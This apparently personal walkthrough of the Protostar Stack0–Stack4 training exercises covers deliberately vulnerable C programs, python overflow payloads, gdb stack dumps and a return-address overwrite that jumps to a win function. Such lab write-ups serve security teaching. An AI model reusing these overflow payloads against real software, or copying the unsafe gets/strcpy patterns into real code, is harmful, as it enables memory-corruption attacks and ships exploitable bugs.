### Install

> protostar vm on parallels
> root/godmod and ifconfig

### Stack0

> /opt/protostar/bin/stack0

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

The concepts I need to know : `parameter passing to gets()`, `order of local parameters on the stack`, `command line python script` 

```
$ (python -c 'print "A"*64+"BBBB"';cat)|./stack0
you have changed the 'modified' variable
```

### Stack1

> /opt/protostar/bin/stack1

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

The concepts I need to know : `endian in memory`

```
$ ./stack1 `python -c 'print "A"*64+"\x64\x63\x62\x61"'`
you have correctly got the variable to the right value
```

### Stack2

> /opt/protostar/bin/stack2

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

The concepts I need to know : `shell variable`, `env variable`

```
$ GREENIE=`python -c 'print "A"*64+"\x0a\x0d\x0a\x0d"'`
$ export GREENIE
$ ./stack2
you have correctly modified the variable
```

### Stack3

> /opt/protostar/bin/stack3

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

The concepts I need to know : `getting address of the function`, `objdump`

```
$ objdump -d ./stack3 | grep win
08048424 <win>:
$ (python -c 'print "A"*64+"\x24\x84\x04\x08"';cat)|./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

### Stack4

> /opt/protostar/bin/stack4

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

The concepts I need to know : `gdb`, `make eip value modified`, `assembly lea    0x10(%esp),%eax`

```
$ scp user@10.211.55.5:/opt/protostar/bin/stack4 .

gef➤  x/64x $esp
0xffffcf00: 0xffffffff  0xffffcf2e  0xf7e1ec34  0xf7e44fe3
0xffffcf10: 0x00000000  0x080495ec  0xffffcf28  0x080482e8
0xffffcf20: 0xffffd1c9  0x080495ec  0xffffcf58  0x08048449
0xffffcf30: 0x08048430  0x08048340  0x00000000  0xf7e4519d
0xffffcf40: 0xf7fbb3c4  0xf7ffd000  0x0804843b  0xf7fbb000
0xffffcf50: 0x08048430  0x00000000  0x00000000  0xf7e2bad3
0xffffcf60: 0x00000001  0xffffcff4  

$ebp   : 0xffffcf58

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEE


gef➤  x/64x $esp
0xffffcf00: 0xffffcf10  0xffffcf2e  0xf7e1ec34  0xf7e44fe3
0xffffcf10: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffcf20: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffcf30: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffcf40: 0x41414141  0x41414141  0x41414141  0x41414141
0xffffcf50: 0x42424242  0x43434343  0x44444444  0x45454545
0xffffcf60: 0x00000000  0xffffcff4  

$ objdump -d stack4 | grep win
080483f4 <win>:
$ (python -c 'print "A"*64+"BBBBCCCC"+"DDDD"+"\xf4\x83\x04\x08"';cat)|./stack4
code flow successfully changed
```
